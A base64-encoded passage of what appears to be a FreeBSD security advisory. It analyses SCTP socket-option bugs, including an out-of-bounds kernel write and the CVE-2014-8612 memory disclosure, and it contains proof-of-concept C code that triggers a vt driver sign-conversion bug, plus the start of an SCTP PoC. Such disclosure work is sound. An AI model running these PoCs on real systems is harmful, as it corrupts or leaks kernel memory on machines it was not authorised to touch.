zc19kZWZhdWx0X3NjaGVkdWxlZCwNCiAgICAgICAgLnNjdHBfc3NfcGFja2V0X2RvbmUgPSBzY3RwX3NzX2RlZmF1bHRfcGFja2V0X2RvbmUsDQogICAgICAgIC5zY3RwX3NzX2dldF92YWx1ZSA9IHNjdHBfc3NfZGVmYXVsdF9nZXRfdmFsdWUsDQogICAgICAgIC5zY3RwX3NzX3NldF92YWx1ZSA9IHNjdHBfc3NfZGVmYXVsdF9zZXRfdmFsdWUNCiAgICB9LA0KLyogU0NUUF9TU19ST1VORF9ST0JJTl9QQUNLRVQgKi8NCiAgICB7DQogICAgICAgIC5zY3RwX3NzX2luaXQgPSBzY3RwX3NzX2RlZmF1bHRfaW5pdCwNCiAgICAgICAgLnNjdHBfc3NfY2xlYXIgPSBzY3RwX3NzX2RlZmF1bHRfY2xlYXIsDQogICAgICAgIC5zY3RwX3NzX2luaXRfc3RyZWFtID0gc2N0cF9zc19kZWZhdWx0X2luaXRfc3RyZWFtLA0KICAgICAgICAuc2N0cF9zc19hZGRfdG9fc3RyZWFtID0gc2N0cF9zc19ycl9hZGQsDQogICAgICAgIC5zY3RwX3NzX2lzX2VtcHR5ID0gc2N0cF9zc19kZWZhdWx0X2lzX2VtcHR5LA0KICAgICAgICAuc2N0cF9zc19yZW1vdmVfZnJvbV9zdHJlYW0gPSBzY3RwX3NzX2RlZmF1bHRfcmVtb3ZlLA0KICAgICAgICAuc2N0cF9zc19zZWxlY3Rfc3RyZWFtID0gc2N0cF9zc19ycnBfc2VsZWN0LA0KICAgICAgICAuc2N0cF9zc19zY2hlZHVsZWQgPSBzY3RwX3NzX2RlZmF1bHRfc2NoZWR1bGVkLA0KICAgICAgICAuc2N0cF9zc19wYWNrZXRfZG9uZSA9IHNjdHBfc3NfcnJwX3BhY2tldF9kb25lLA0KICAgICAgICAuc2N0cF9zc19nZXRfdmFsdWUgPSBzY3RwX3NzX2RlZmF1bHRfZ2V0X3ZhbHVlLA0KICAgICAgICAuc2N0cF9zc19zZXRfdmFsdWUgPSBzY3RwX3NzX2RlZmF1bHRfc2V0X3ZhbHVlDQogICAgfSwNCi8qIFNDVFBfU1NfUFJJT1JJVFkgKi8NCiAgICB7DQogICAgICAgIC5zY3RwX3NzX2luaXQgPSBzY3RwX3NzX2RlZmF1bHRfaW5pdCwNCiAgICAgICAgLnNjdHBfc3NfY2xlYXIgPSBzY3RwX3NzX3ByaW9fY2xlYXIsDQogICAgICAgIC5zY3RwX3NzX2luaXRfc3RyZWFtID0gc2N0cF9zc19wcmlvX2luaXRfc3RyZWFtLA0KICAgICAgICAuc2N0cF9zc19hZGRfdG9fc3RyZWFtID0gc2N0cF9zc19wcmlvX2FkZCwNCiAgICAgICAgLnNjdHBfc3NfaXNfZW1wdHkgPSBzY3RwX3NzX2RlZmF1bHRfaXNfZW1wdHksDQogICAgICAgIC5zY3RwX3NzX3JlbW92ZV9mcm9tX3N0cmVhbSA9IHNjdHBfc3NfcHJpb19yZW1vdmUsDQogICAgICAgIC5zY3RwX3NzX3NlbGVjdF9zdHJlYW0gPSBzY3RwX3NzX3ByaW9fc2VsZWN0LA0KICAgICAgICAuc2N0cF9zc19zY2hlZHVsZWQgPSBzY3RwX3NzX2RlZmF1bHRfc2NoZWR1bGVkLA0KICAgICAgICAuc2N0cF9zc19wYWNrZXRfZG9uZSA9IHNjdHBfc3NfZGVmYXVsdF9wYWNrZXRfZG9uZSwNCiAgICAgICAgLnNjdHBfc3NfZ2V0X3ZhbHVlID0gc2N0cF9zc19wcmlvX2dldF92YWx1ZSwNCiAgICAgICAgLnNjdHBfc3Nfc2V0X3ZhbHVlID0gc2N0cF9zc19wcmlvX3NldF92YWx1ZQ0KICAgIH0sDQovKiBTQ1RQX1NTX0ZBSVJfQkFORFdJVEggKi8NCiAgICB7DQogICAgICAgIC5zY3RwX3NzX2luaXQgPSBzY3RwX3NzX2RlZmF1bHRfaW5pdCwNCiAgICAgICAgLnNjdHBfc3NfY2xlYXIgPSBzY3RwX3NzX2ZiX2NsZWFyLA0KICAgICAgICAuc2N0cF9zc19pbml0X3N0cmVhbSA9IHNjdHBfc3NfZmJfaW5pdF9zdHJlYW0sDQogICAgICAgIC5zY3RwX3NzX2FkZF90b19zdHJlYW0gPSBzY3RwX3NzX2ZiX2FkZCwNCiAgICAgICAgLnNjdHBfc3NfaXNfZW1wdHkgPSBzY3RwX3NzX2RlZmF1bHRfaXNfZW1wdHksDQogICAgICAgIC5zY3RwX3NzX3JlbW92ZV9mcm9tX3N0cmVhbSA9IHNjdHBfc3NfZmJfcmVtb3ZlLA0KICAgICAgICAuc2N0cF9zc19zZWxlY3Rfc3RyZWFtID0gc2N0cF9zc19mYl9zZWxlY3QsDQogICAgICAgIC5zY3RwX3NzX3NjaGVkdWxlZCA9IHNjdHBfc3NfZmJfc2NoZWR1bGVkLA0KICAgICAgICAuc2N0cF9zc19wYWNrZXRfZG9uZSA9IHNjdHBfc3NfZGVmYXVsdF9wYWNrZXRfZG9uZSwNCiAgICAgICAgLnNjdHBfc3NfZ2V0X3ZhbHVlID0gc2N0cF9zc19kZWZhdWx0X2dldF92YWx1ZSwNCiAgICAgICAgLnNjdHBfc3Nfc2V0X3ZhbHVlID0gc2N0cF9zc19kZWZhdWx0X3NldF92YWx1ZQ0KICAgIH0sDQovKiBTQ1RQX1NTX0ZJUlNUX0NPTUUgKi8NCiAgICB7DQogICAgICAgIC5zY3RwX3NzX2luaXQgPSBzY3RwX3NzX2ZjZnNfaW5pdCwNCiAgICAgICAgLnNjdHBfc3NfY2xlYXIgPSBzY3RwX3NzX2ZjZnNfY2xlYXIsDQogICAgICAgIC5zY3RwX3NzX2luaXRfc3RyZWFtID0gc2N0cF9zc19mY2ZzX2luaXRfc3RyZWFtLA0KICAgICAgICAuc2N0cF9zc19hZGRfdG9fc3RyZWFtID0gc2N0cF9zc19mY2ZzX2FkZCwNCiAgICAgICAgLnNjdHBfc3NfaXNfZW1wdHkgPSBzY3RwX3NzX2ZjZnNfaXNfZW1wdHksDQogICAgICAgIC5zY3RwX3NzX3JlbW92ZV9mcm9tX3N0cmVhbSA9IHNjdHBfc3NfZmNmc19yZW1vdmUsDQogICAgICAgIC5zY3RwX3NzX3NlbGVjdF9zdHJlYW0gPSBzY3RwX3NzX2ZjZnNfc2VsZWN0LA0KICAgICAgICAuc2N0cF9zc19zY2hlZHVsZWQgPSBzY3RwX3NzX2RlZmF1bHRfc2NoZWR1bGVkLA0KICAgICAgICAuc2N0cF9zc19wYWNrZXRfZG9uZSA9IHNjdHBfc3NfZGVmYXVsdF9wYWNrZXRfZG9uZSwNCiAgICAgICAgLnNjdHBfc3NfZ2V0X3ZhbHVlID0gc2N0cF9zc19kZWZhdWx0X2dldF92YWx1ZSwNCiAgICAgICAgLnNjdHBfc3Nfc2V0X3ZhbHVlID0gc2N0cF9zc19kZWZhdWx0X3NldF92YWx1ZQ0KICAgIH0NCn07DQoNCiAgICAgDQotLS0tLS8NCg0KTm90ZSB0aGF0IHRoZSB2YWx1ZSBmb3IgdGhlICdzY3RwX3NzX3NldF92YWx1ZScgZmllbGQgaXMgKmFsbW9zdCogYWx3YXlzIHNldCB0byAnc2N0cF9zc19kZWZhdWx0X3NldF92YWx1ZScsIHdoaWNoIGlzIGp1c3QgYSBkdW1teSBmdW5jdGlvbiBkZWZpbmVkIGluICdzeXMvbmV0aW5ldC9zY3RwX3NzX2Z1bmN0aW9ucy5jJzoNCg0KDQovLS0tLS0NCnN0YXRpYyBpbnQNCnNjdHBfc3NfZGVmYXVsdF9zZXRfdmFsdWUoc3RydWN0IHNjdHBfdGNiICpzdGNiIFNDVFBfVU5VU0VELCBzdHJ1Y3Qgc2N0cF9hc3NvY2lhdGlvbiAqYXNvYyBTQ1RQX1VOVVNFRCwNCiAgICBzdHJ1Y3Qgc2N0cF9zdHJlYW1fb3V0ICpzdHJxIFNDVFBfVU5VU0VELCB1aW50MTZfdCB2YWx1ZSBTQ1RQX1VOVVNFRCkNCnsNCiAgICAvKiBOb3RoaW5nIHRvIGJlIGRvbmUgaGVyZSAqLw0KICAgIHJldHVybiAoLTEpOw0KfQ0KICAgICANCi0tLS0tLw0KDQpUaGUgb25seSBjYXNlIGluIHdoaWNoIHRoZSAnc2N0cF9zc19zZXRfdmFsdWUnIGZpZWxkIGlzIHNldCB0byBhIGRpZmZlcmVudCB2YWx1ZSBpcyBpbiB0aGUgNHRoIGVsZW1lbnQgb2YgdGhlIGFycmF5LCB3aGljaCBjb3JyZXNwb25kcyB0byB0aGUgJ1NDVFBfU1NfUFJJT1JJVFknIHNvY2tldCBvcHRpb247IGluIHRoYXQgY2FzZSwgdGhlIGZ1bmN0aW9uIHBvaW50ZXIgaXMgc2V0IHRvICdzY3RwX3NzX3ByaW9fc2V0X3ZhbHVlJywgd2hpY2ggaXMgYSBmdW5jdGlvbiBkZWZpbmVkIGluICdzeXMvbmV0aW5ldC9zY3RwX3NzX2Z1bmN0aW9ucy5jJzoNCg0KDQovLS0tLS0NCnN0YXRpYyBpbnQNCnNjdHBfc3NfcHJpb19zZXRfdmFsdWUoc3RydWN0IHNjdHBfdGNiICpzdGNiLCBzdHJ1Y3Qgc2N0cF9hc3NvY2lhdGlvbiAqYXNvYywNCiAgICBzdHJ1Y3Qgc2N0cF9zdHJlYW1fb3V0ICpzdHJxLCB1aW50MTZfdCB2YWx1ZSkNCnsNCiAgICBpZiAoc3RycSA9PSBOVUxMKSB7DQogICAgICAgIHJldHVybiAoLTEpOw0KICAgIH0NCiAgICBzdHJxLT5zc19wYXJhbXMucHJpby5wcmlvcml0eSA9IHZhbHVlOw0KICAgIHNjdHBfc3NfcHJpb19yZW1vdmUoc3RjYiwgYXNvYywgc3RycSwgTlVMTCwgMSk7DQogICAgc2N0cF9zc19wcmlvX2FkZChzdGNiLCBhc29jLCBzdHJxLCBOVUxMLCAxKTsNCiAgICByZXR1cm4gKDEpOw0KfQ0KICAgICANCi0tLS0tLw0KDQpUaGUgJ3ZhbHVlJyBwYXJhbWV0ZXIgaXMgZnVsbHkgY29udHJvbGxlZCBieSB0aGUgYXR0YWNrZXIsIGFuZCB0aGUgYWN0dWFsIHZhbHVlIG9mIHRoZSAnc3RycScgcG9pbnRlciBwYXJhbWV0ZXIgaXMgdGhlIGFkZHJlc3MgJyZzdGNiLT5hc29jLnN0cm1vdXRbYXYtPnN0cmVhbV9pZF0nIGluIHdoaWNoIHRoZSBhdHRhY2tlciBjYW4gc2V0IHRoZSAnYXYtPnN0cmVhbV9pZCcgaW5kZXggYmV5b25kIHRoZSBib3VuZGFyaWVzIG9mIHRoZSBhcnJheSwgc28gdGhpcyBmdW5jdGlvbiB3aWxsIHByb3ZpZGUgYSB3cml0ZS13aGF0LXdoZXJlIG1lbW9yeSBjb3JydXB0aW9uIHByaW1pdGl2ZSB3aGVuIGRvaW5nIHRoZSAnc3RycS0+c3NfcGFyYW1zLnByaW8ucHJpb3JpdHkgPSB2YWx1ZScgYXNzaWdubWVudC4gVGhpcyBtZW1vcnkgY29ycnVwdGlvbiB2dWxuZXJhYmlsaXR5IGFsbG93cyBhIGxvY2FsIHVucHJpdmlsZWdlZCBhdHRhY2tlciB0byBvdmVyd3JpdGUga2VybmVsIG1lbW9yeSBvdXRzaWRlIG9mIHRoZSAnc3RjYi0+YXNvYy5zdHJtb3V0JyBhcnJheSB3aXRoIGFuIGFyYml0cmFyeSAndWludDE2X3QnIHZhbHVlLg0KDQpJbiBvcmRlciB0byBtYWtlIHVzZSBvZiB0aGUgJ3NjdHBfc3NfcHJpb19zZXRfdmFsdWUnIGZ1bmN0aW9uLCB0aGUgYXR0YWNrZXIgbmVlZHMgdG8gc2V0IHVwIHRoZSAnc3RjYi0+YXNvYy5zc19mdW5jdGlvbnMnIHN0cnVjdCB3aXRoIHRoZSBmdW5jdGlvbiBwb2ludGVycyBiZWxvbmdpbmcgdG8gdGhlICdTQ1RQX1NTX1BSSU9SSVRZJyBzb2NrZXQgb3B0aW9uLiBUaGlzIGNhbiBiZSBkb25lIGJ5IGhpdHRpbmcgdGhlIGZvbGxvd2luZyBjb2RlIGluIHRoZSAnc2N0cF9zZXRvcHQnIGZ1bmN0aW9uOyBhcyBjYW4gYmUgc2VlbiwgdGhlICdzdGNiLT5hc29jLnNzX2Z1bmN0aW9ucycgc3RydWN0IGNhbiBiZSBwcm9wZXJseSBzZXQgdXAgZm9yIHRoZSBhdHRhY2sgYnkgc2V0dGluZyBhbiAnU0NUUF9QTFVHR0FCTEVfU1MnIHNvY2tldCBvcHRpb24gd2l0aCBhbiBvcHRpb24gdmFsdWUgb2YgdHlwZSAnc3RydWN0IHNjdHBfYXNzb2NfdmFsdWUnIGhhdmluZyBpdHMgJ2Fzc29jX3ZhbHVlJyBmaWVsZCBzZXQgdG8gJ1NDVFBfU1NfUFJJT1JJVFknIChzZWUgdGhlICdzdGNiLT5hc29jLnNzX2Z1bmN0aW9ucyA9IHNjdHBfc3NfZnVuY3Rpb25zW2F2LT5hc3NvY192YWx1ZV0gJyBzdGF0ZW1lbnQpOg0KDQoNCi8tLS0tLQ0KICAgIGNhc2UgU0NUUF9QTFVHR0FCTEVfU1M6DQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cnVjdCBzY3RwX2Fzc29jX3ZhbHVlICphdjsNCg0KICAgICAgICAgICAgU0NUUF9DSEVDS19BTkRfQ0FTVChhdiwgb3B0dmFsLCBzdHJ1Y3Qgc2N0cF9hc3NvY192YWx1ZSwgb3B0c2l6ZSk7DQogICAgICAgICAgICAvKiBDaGVja3MgaWYgYXYtPmFzc29jX3ZhbHVlIGlzIGEgdmFsaWQgaW5kZXggd2l0aGluIHRoZSBzY3RwX3NzX2Z1bmN0aW9ucyBhcnJheSAqLw0KICAgICAgICAgICAgaWYgKChhdi0+YXNzb2NfdmFsdWUgIT0gU0NUUF9TU19ERUZBVUxUKSAmJg0KICAgICAgICAgICAgICAgIChhdi0+YXNzb2NfdmFsdWUgIT0gU0NUUF9TU19ST1VORF9ST0JJTikgJiYNCiAgICAgICAgICAgICAgICAoYXYtPmFzc29jX3ZhbHVlICE9IFNDVFBfU1NfUk9VTkRfUk9CSU5fUEFDS0VUKSAmJg0KICAgICAgICAgICAgICAgIChhdi0+YXNzb2NfdmFsdWUgIT0gU0NUUF9TU19QUklPUklUWSkgJiYNCiAgICAgICAgICAgICAgICAoYXYtPmFzc29jX3ZhbHVlICE9IFNDVFBfU1NfRkFJUl9CQU5EV0lUSCkgJiYNCiAgICAgICAgICAgICAgICAoYXYtPmFzc29jX3ZhbHVlICE9IFNDVFBfU1NfRklSU1RfQ09NRSkpIHsNCiAgICAgICAgICAgICAgICBTQ1RQX0xUUkFDRV9FUlJfUkVUKGlucCwgTlVMTCwgTlVMTCwgU0NUUF9GUk9NX1NDVFBfVVNSUkVRLCBFSU5WQUwpOw0KICAgICAgICAgICAgICAgIGVycm9yID0gRUlOVkFMOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgU0NUUF9GSU5EX1NUQ0IoaW5wLCBzdGNiLCBhdi0+YXNzb2NfaWQpOw0KICAgICAgICAgICAgaWYgKHN0Y2IpIHsNCiAgICAgICAgICAgICAgICBzdGNiLT5hc29jLnNzX2Z1bmN0aW9ucy5zY3RwX3NzX2NsZWFyKHN0Y2IsICZzdGNiLT5hc29jLCAxLCAxKTsNCiAgICAgICAgICAgICAgICAvKiBUaGUgZnVuY3Rpb24gcG9pbnRlcnMgc3RydWN0IGlzIHNldCB1cCBoZXJlISEhICovDQogICAgICAgICAgICAgICAgc3RjYi0+YXNvYy5zc19mdW5jdGlvbnMgPSBzY3RwX3NzX2Z1bmN0aW9uc1thdi0+YXNzb2NfdmFsdWVdOw0KICAgICAgICAgICAgICAgIHN0Y2ItPmFzb2Muc3RyZWFtX3NjaGVkdWxpbmdfbW9kdWxlID0gYXYtPmFzc29jX3ZhbHVlOw0KICAgICAgICAgICAgICAgIHN0Y2ItPmFzb2Muc3NfZnVuY3Rpb25zLnNjdHBfc3NfaW5pdChzdGNiLCAmc3RjYi0+YXNvYywgMSk7DQogICAgICAgICAgICAgICAgU0NUUF9UQ0JfVU5MT0NLKHN0Y2IpOw0KICAgICANCi0tLS0tLw0KDQoNCjguMy4gKkZyZWVCU0QgU0NUUCBTb2NrZXQgU0NUUF9TU19WQUxVRSBLZXJuZWwgTWVtb3J5IERpc2Nsb3N1cmUgVnVsbmVyYWJpbGl0eSoNCg0KW0NWRS0yMDE0LTg2MTJdDQpUaGUgdGhpcmQgdnVsbmVyYWJpbGl0eSBpcyBjbG9zZWx5IHJlbGF0ZWQgdG8gdGhlIHNlY29uZCBvbmUuIFRoZSBGcmVlQlNEIGtlcm5lbCBpcyBwcm9uZSB0byBhIGtlcm5lbCBtZW1vcnkgZGlzY2xvc3VyZSB3aGVuIHJlYWRpbmcgdGhlIHZhbHVlIG9mIHRoZSAnU0NUUF9TU19WQUxVRScgU0NUUCBzb2NrZXQgb3B0aW9uIHZpYSB0aGUgJ2dldHNvY2tvcHQnIHN5c3RlbSBjYWxsLCB3aGljaCBhbGxvd3MgbG9jYWwgdW5wcml2aWxlZ2VkIGF0dGFja2VycyB0byByZWFkIDE2LWJpdCB2YWx1ZXMgYmVsb25naW5nIHRvIHRoZSBrZXJuZWwgbWVtb3J5IHNwYWNlLg0KDQpUaGUgaGFuZGxpbmcgb2YgdGhlICdnZXRzb2Nrb3B0JyBzeXN0ZW0gY2FsbCBhdCB0aGUgU0NUUCBsZXZlbCBpcyBwZXJmb3JtZWQgYnkgdGhlIGZ1bmN0aW9uICdzY3RwX2dldG9wdCcgW2ZpbGUgJ3N5cy9uZXRpbmV0L3NjdHBfdXNlcnJlcS5jJ106DQogICAgDQoNCi8tLS0tLQ0Kc3RhdGljIGludA0Kc2N0cF9nZXRvcHQoc3RydWN0IHNvY2tldCAqc28sIGludCBvcHRuYW1lLCB2b2lkICpvcHR2YWwsIHNpemVfdCAqb3B0c2l6ZSwNCiAgICB2b2lkICpwKQ0Kew0KICAgIFsuLi5dDQogICAgc3dpdGNoIChvcHRuYW1lKSB7DQogICAgWy4uLl0NCiAgICBjYXNlIFNDVFBfU1NfVkFMVUU6DQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cnVjdCBzY3RwX3N0cmVhbV92YWx1ZSAqYXY7DQoNCiAgICAgICAgICAgIFNDVFBfQ0hFQ0tfQU5EX0NBU1QoYXYsIG9wdHZhbCwgc3RydWN0IHNjdHBfc3RyZWFtX3ZhbHVlLCAqb3B0c2l6ZSk7DQogICAgICAgICAgICBTQ1RQX0ZJTkRfU1RDQihpbnAsIHN0Y2IsIGF2LT5hc3NvY19pZCk7DQogICAgICAgICAgICBpZiAoc3RjYikgew0KICAgICAgICAgICAgICAgIGlmIChzdGNiLT5hc29jLnNzX2Z1bmN0aW9ucy5zY3RwX3NzX2dldF92YWx1ZShzdGNiLCAmc3RjYi0+YXNvYywgJnN0Y2ItPmFzb2Muc3RybW91dFthdi0+c3RyZWFtX2lkXSwNCiAgICAgICAgICAgICAgICAgICAgJmF2LT5zdHJlYW1fdmFsdWUpIDwgMCkgew0KICAgICANCi0tLS0tLw0KDQpXaGVuIGhhbmRsaW5nIHRoZSAnU0NUUF9TU19WQUxVRScgc29ja2V0IG9wdGlvbiwgdGhlICdvcHR2YWwnIG9wdGlvbiB2YWx1ZSAod2hpY2ggaXMgZnVsbHkgY29udHJvbGxlZCBieSB0aGUgbG9jYWwgYXR0YWNrZXIpLCBpcyBjYXN0ZWQgdG8gdGhlICdzdHJ1Y3Qgc2N0cF9zdHJlYW1fdmFsdWUgKicgdHlwZSBhbmQgc3RvcmVkIGludG8gdGhlICdhdicgdmFyaWFibGUgYnkgdXNpbmcgdGhlICdTQ1RQX0NIRUNLX0FORF9DQVNUJyBtYWNyby4gQWZ0ZXIgdGhhdCwgaWYgdGhlICdzY3RiJyBwb2ludGVyIGlzIG5vdCAnTlVMTCcgKGNvbmRpdGlvbiB0aGF0IGNhbiBiZSBhY2hpZXZlZCBieSBoYXZpbmcgdGhlIFNDVFAgc29ja2V0IGluIGEgKmNvbm5lY3RlZCogc3RhdGUpLCB0aGUgJ3N0Y2ItPmFzb2Muc3NfZnVuY3Rpb25zLnNjdHBfc3NfZ2V0X3ZhbHVlJyBmdW5jdGlvbiBwb2ludGVyIGlzIGNhbGxlZC4gVGhlIHRoaXJkIGFyZ3VtZW50IGZvciB0aGlzIGZ1bmN0aW9uIGlzICcmc3RjYi0+YXNvYy5zdHJtb3V0W2F2LT5zdHJlYW1faWRdJy4gQXMgY2FuIGJlIHNlZW4sIHRoZSB1bnN0cnVzdGVkICdhdi0+c3RyZWFtX2lkJyB2YWx1ZSAod2hpY2ggaXMgZnVsbHkgY29udHJvbGxlZCBieSB0aGUgbG9jYWwgYXR0YWNrZXIpIGlzIHVzZWQgYXMgYW4gaW5kZXggd2l0aGluIHRoZSAnc3RjYi0+YXNvYy5zdHJtb3V0JyBhcnJheSB3aXRob3V0IHByb3Blcmx5IGNoZWNraW5nIGlmIGl0J3Mgd2l0aGluIHRoZSBib3VuZHMgb2YgdGhlIGFycmF5Lg0KDQpUaGUgZGVmYXVsdCB2YWx1ZSBmb3IgdGhlICdzY3RwX3NzX2dldF92YWx1ZScgZnVuY3Rpb24gcG9pbnRlciBpcyAnc2N0cF9zc19kZWZhdWx0X2dldF92YWx1ZScsIHdoaWNoIGlzIGp1c3QgYSBkdW1teSBmdW5jdGlvbiBkZWZpbmVkIGluICdzeXMvbmV0aW5ldC9zY3RwX3NzX2Z1bmN0aW9ucy5jJzoNCg0KDQovLS0tLS0NCnN0YXRpYyBpbnQNCnNjdHBfc3NfZGVmYXVsdF9nZXRfdmFsdWUoc3RydWN0IHNjdHBfdGNiICpzdGNiIFNDVFBfVU5VU0VELCBzdHJ1Y3Qgc2N0cF9hc3NvY2lhdGlvbiAqYXNvYyBTQ1RQX1VOVVNFRCwNCiAgICBzdHJ1Y3Qgc2N0cF9zdHJlYW1fb3V0ICpzdHJxIFNDVFBfVU5VU0VELCB1aW50MTZfdCAqIHZhbHVlIFNDVFBfVU5VU0VEKQ0Kew0KICAgIC8qIE5vdGhpbmcgdG8gYmUgZG9uZSBoZXJlICovDQogICAgcmV0dXJuICgtMSk7DQp9DQogICAgIA0KLS0tLS0vDQoNClRoZSBvbmx5IHVzZWZ1bCBwb3NzaWJsZSB2YWx1ZSBmb3IgdGhpcyBmdW5jdGlvbiBwb2ludGVyIGlzICdzY3RwX3NzX3ByaW9fZ2V0X3ZhbHVlJywgd2hpY2ggYmVsb25ncyB0byB0aGUgZnVuY3Rpb24gcG9pbnRlcnMgb2YgdGhlICdTQ1RQX1NTX1BSSU9SSVRZJyBzb2NrZXQgb3B0aW9uOiANCg0KICAgIA0KLy0tLS0tDQpzdGF0aWMgaW50DQpzY3RwX3NzX3ByaW9fZ2V0X3ZhbHVlKHN0cnVjdCBzY3RwX3RjYiAqc3RjYiBTQ1RQX1VOVVNFRCwgc3RydWN0IHNjdHBfYXNzb2NpYXRpb24gKmFzb2MgU0NUUF9VTlVTRUQsDQogICAgc3RydWN0IHNjdHBfc3RyZWFtX291dCAqc3RycSwgdWludDE2X3QgKiB2YWx1ZSkNCnsNCiAgICBpZiAoc3RycSA9PSBOVUxMKSB7DQogICAgICAgIHJldHVybiAoLTEpOw0KICAgIH0NCiAgICAqdmFsdWUgPSBzdHJxLT5zc19wYXJhbXMucHJpby5wcmlvcml0eTsNCiAgICByZXR1cm4gKDEpOw0KfQ0KICAgICANCi0tLS0tLw0KDQpUaGUgYWN0dWFsIHZhbHVlIG9mIHRoZSAnc3RycScgcG9pbnRlciBwYXJhbWV0ZXIgaXMgdGhlIGFkZHJlc3MgJyZzdGNiLT5hc29jLnN0cm1vdXRbYXYtPnN0cmVhbV9pZF0nIGluIHdoaWNoIHRoZSBhdHRhY2tlciBjYW4gc2V0IHRoZSAnYXYtPnN0cmVhbV9pZCcgaW5kZXggYmV5b25kIHRoZSBib3VuZGFyaWVzIG9mIHRoZSBhcnJheSwgc28gdGhpcyBmdW5jdGlvbiB3aWxsIGFsbG93IGEgbG9jYWwgdW5wcml2aWxlZ2VkIGF0dGFja2VyIHRvIHJlYWQgYW4gJ3VpbnQxNl90JyB2YWx1ZSBiZWxvbmdpbmcgdG8gdGhlIGtlcm5lbCBtZW1vcnkgb3V0c2lkZSBvZiB0aGUgJ3N0Y2ItPmFzb2Muc3RybW91dCcgYXJyYXkgd2hlbiBkb2luZyB0aGUgJyp2YWx1ZSA9IHN0cnEtPnNzX3BhcmFtcy5wcmlvLnByaW9yaXR5JyBhc3NpZ25tZW50LiANCiAgICANCkluIG9yZGVyIHRvIG1ha2UgdXNlIG9mIHRoZSAnc2N0cF9zc19wcmlvX2dldF92YWx1ZScgZnVuY3Rpb24sIHRoZSBhdHRhY2tlciBuZWVkcyB0byBzZXQgdXAgdGhlICdzdGNiLT5hc29jLnNzX2Z1bmN0aW9ucycgc3RydWN0IHdpdGggdGhlIGZ1bmN0aW9uIHBvaW50ZXJzIGJlbG9uZ2luZyB0byB0aGUgJ1NDVFBfU1NfUFJJT1JJVFknIHNvY2tldCBvcHRpb24sIGFzIGl0IHdhcyBwcmV2aW91c2x5IGV4cGxhaW5lZCBmb3IgdGhlIHNlY29uZCB2dWxuZXJhYmlsaXR5Lg0KDQoNCjguNC4gKlByb29mIG9mIENvbmNlcHQqDQoNClRoZSBmb2xsb3dpbmcgY29kZSBpcyBhIFByb29mIG9mIENvbmNlcHQgZm9yIHRoZSBmaXJzdCB2dWxuZXJhYmlsaXR5Og0KDQoNCi8tLS0tLQ0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL2NvbnNpby5oPg0KI2luY2x1ZGUgPHN5cy9pb2N0bC5oPg0KI2luY2x1ZGUgPGZjbnRsLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndil7DQogICAgaW50IGZkOw0KDQogICAgcHJpbnRmKCIqKiBGcmVlQlNEIHZ0IERyaXZlciBWVF9XQUlUQUNUSVZFIFNpZ24gQ29udmVyc2lvbiBWdWxuZXJhYmlsaXR5IFBvQyAqKlxuIik7DQoNCiAgICBpZiAoYXJnYyA8IDIpew0KICAgICAgICBwcmludGYoIlxuVXNhZ2U6IC4vcG9jX3Z0IDwvZGV2L3R0eXYqPiwgd2hlcmUgdHR5diogaXMgeW91ciBjdXJyZW50IHZpcnR1YWwgdGVybWluYWwuXG4iKTsNCiAgICAgICAgcHJpbnRmKCJcbkV4YW1wbGU6IC4vcG9jX3Z0IC9kZXYvdHR5djFcblxuIik7DQogICAgICAgIGV4aXQoMSk7DQogICAgfQ0KDQogICAgZmQgPSBvcGVuKGFyZ3ZbMV0sIE9fUkRPTkxZKTsNCiAgICBpZiAoZmQgPT0gLTEpew0KICAgICAgICBwZXJyb3IoIm9wZW4iKTsNCiAgICAgICAgZXhpdCgxKTsNCiAgICB9DQoNCiAgICAvKiAweDkwOTE5MjkzIGlzIGEgbmVnYXRpdmUgbnVtYmVyIHdoZW4gaXQncyBpbnRlcnByZXRlZCBhcyBhIHNpZ25lZCBpbnQsIHRodXMgaXQgd2lsbCBieXBhc3MgdGhlIA0KICAgICAqIChzaWduZWQpIGJvdW5kYXJ5IGNoZWNrIHRoYXQgdHJpZXMgdG8gZ3VhcmFudGVlIHRoYXQgdGhpcyB2YWx1ZSBpcyBub3QgZ3JlYXRlciB0aGFuIFZUX01BWFdJTkRPV1MgKDEyKS4NCiAgICAgKiBUaGlzIHZhbHVlIHdpbGwgYmUgdWx0aW1hdGVseSB1c2VkIGFzIGFuIGluZGV4IHRvIGFjY2VzcyB0aGUgdmQtPnZkX3dpbmRvd3MgYXJyYXkuDQogICAgICovDQogICAgaWYgKGlvY3RsKGZkLCBWVF9XQUlUQUNUSVZFLCAodm9pZCAqKSAweDkwOTE5MjkzKSA9PSAtMSl7DQogICAgICAgIHBlcnJvcigiaW9jdGwiKTsNCiAgICB9DQoNCiAgICBjbG9zZShmZCk7DQogICAgcmV0dXJuIDA7DQp9DQoNCiAgICAgDQotLS0tLS8NCg0KVGhlIGZvbGxvd2luZyBjb2RlIGlzIGEgUHJvb2Ygb2YgQ29uY2VwdCBmb3IgdGhlIHNlY29uZCB2dWxuZXJhYmlsaXR5Og0KDQoNCi8tLS0tLQ0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+DQojaW5jbHVkZSA8bmV0aW5ldC9zY3RwLmg+DQojaW5jbHVkZSA8bmV0aW5ldC9zY3RwX3Vpby5oPg0KI2luY2x1ZGUgPGFycGEvaW5ldC5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQoNCiNkZWZpbmUgUE9SVCA0NDQ0DQojZGVmaW5lIEFERFIgIjEyNy4wLjAuMSINCg0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSkgew0KICAgIGludCBmZDsNCiAgICBzdHJ1Y3Qgc29ja2FkZHJfaW4gYWRkcjsNCiAgICBzdHJ1Y3Qgc2N0cF9pbml0bXNnIGluaXQ7DQogICAgc3RydWN0IHNjdHBfc3RyZWFtX3ZhbHVlIHN0cmVhbV92YWx1ZTsNCiAgICBzdHJ1Y3Qgc2N